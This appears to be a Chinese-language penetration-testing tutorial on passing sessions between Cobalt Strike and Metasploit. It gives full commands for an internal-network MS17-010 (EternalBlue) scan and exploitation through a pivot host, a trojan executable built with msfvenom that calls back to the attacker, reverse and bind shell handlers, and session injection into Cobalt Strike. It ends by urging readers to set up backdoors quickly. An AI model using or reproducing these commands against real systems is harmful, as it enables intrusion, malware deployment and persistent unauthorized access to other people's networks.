## **CS转MSF**
CS上线后可以探测永恒之蓝，但转到MSF更好探测和攻击利用。


CS创建一个监听器
```
类型选择Foreign HTTP
名字：msf
host：输入MSF的IP地址
端口：MSF监听的端口
```
MSF开启监听
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http   ##这里一定不要输入错误，你上面监听器是http，那么这里就是http
set lhost 0.0.0.0
set lport 3010                  ##端口根据你自己的修改
run
```
CS再输入命令spawn msf 即可。

此时在MSF会话中
```
查看角色
getuid

添加内网路由
run post/multi/manage/autoroute

查看内网路由 此时有192.168.3.0
run autoroute -p

会话后台
background

使用永恒之蓝检测模块 批量检测
use auxiliary/scanner/smb/smb_ms17_010
show options
set rhosts 192.168.3.21-32
set threads 5
run

此时检测到192.168.3.21:445存在漏洞
利用上线
use exploit/windows/smb/ms17_010_eternalblue
能出网，用反向上线(默认反向)
3.21机不能出网，用正向上线
set payload windows/x64/meterpreter/bind_tcp
show options
set rhosts 192.168.3.21
set lport 4444
run
最终通过跳板机连接 3.21内网机4444端口 上线。
```

^
## **MSF转CS**
MSF联动CS，主要是将MSF的会话转移到CS上。
利用MSF生成木马，让其上线然后在转交给CS。


这里生成一个木马，然后上传到目标主机上，主要要注意这个IP地址和端口别设置错了或者忘记了。
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXXX.XXX.XXXX.XX LPORT=4444 -f exe -o 123.exe
```
这里设置的监听，就是将上面的木马，再执行后能够建立会话。
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 3000
exploit
```

 CS设置监听

这里设置监听，由于是MSF主动去连接CS，所以这里设置反向连接即可。



MSF转移会话
到转移会话这里，主要就是将MSF刚刚木马上线的会话迁移到CS上。
```
use exploit/windows/local/payload_inject //使用该模块可以将 Metasploit 获取到的会话注入到CS中
set payload windows/meterpreter/reverse_http //和cs监听器保持一致
set prependmigrate true     #可以不设置，但是端口不要和CS冲突了。
set DisablePayloadHandler true  #可以不设置
set lhost XXXX.XXX.XXX.XX    //CS的IP
set lport XXX   //CS上的listen端口
set session 1   //要转发的session
run 
```
这里可以CS看到是成功上线了。
这里主要就是介绍如何迁移会话，迁移会话后尽量在条件允许的情况快，尽快建立起相应的后门，比如你MSF迁移到CS，迁移后尽快上传CS的木马，免得掉线或者不注意MSF被关闭了。


